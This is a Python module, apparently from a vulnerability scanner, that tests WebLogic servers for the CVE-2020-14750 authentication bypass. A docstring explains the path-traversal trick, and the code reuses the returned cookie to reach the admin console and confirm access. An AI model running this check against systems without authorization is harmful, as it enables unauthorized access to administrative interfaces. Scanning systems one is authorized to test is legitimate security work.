#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def cve_2020_14750_scan(self, url):
    ''' Weblogic 权限验证绕过漏洞
            可通过目录跳转符../回到上一级目录, 然后在../后面拼接console后台目录, 即可绕过后台登录, 直接进入后台
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unAuthorized'
    vul_info['vul_id'] = 'CVE-2020-14750'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers
    headers.update(vul_info['headers'])

    for payload in self.cve_2020_14750_payloads:    # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res1 = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies,
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res1.status_code, res1)                        # * LOG

            if ((res1.status_code == 302) and ('Set-Cookie' in res1.headers)):
                try:
                    cookie = {
                        'Cookie': res1.headers['Set-Cookie']
                    }
                    headers.update(cookie)
                except KeyError:
                    continue

                res2 = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res2.status_code, res2)                        # * LOG
            else:
                continue

            if (('管理控制台' in res2.text) 
                or ('Information and Resources' in res2.text) 
                or ('Overloaded' in res2.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
